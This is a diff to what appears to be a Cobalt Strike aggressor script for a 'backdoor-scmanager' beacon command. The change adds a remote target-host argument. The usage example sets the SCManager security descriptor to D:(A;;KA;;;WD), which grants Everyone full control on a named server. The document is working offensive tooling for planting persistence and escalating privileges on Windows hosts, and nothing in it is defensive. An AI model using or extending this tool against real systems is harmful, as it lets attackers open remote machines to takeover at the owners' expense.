@@ -7,7 +7,7 @@ alias backdoor-scmanager {
     $bof    = readb($handle, -1);
     closef($handle);
 
-    $args   = bof_pack($1, "z", $2);
+    $args   = bof_pack($1, "zz", $2, $3);
 
     btask($1, "Running BackdoorSCManager BOF");
 
@@ -18,5 +18,5 @@ beacon_command_register(
 "backdoor-scmanager",
 "Backdoors SCManager SDDL",
 "\
-usage:    backdoor-scmanager <SDDL_TO_SET>\
-example:  backdoor-scmanager D:(A;;KA;;;WD)");
+usage:    backdoor-scmanager <TARGET_HOST> <SDDL_TO_SET>\
+example:  backdoor-scmanager SRV01.megacorp.local D:(A;;KA;;;WD)");
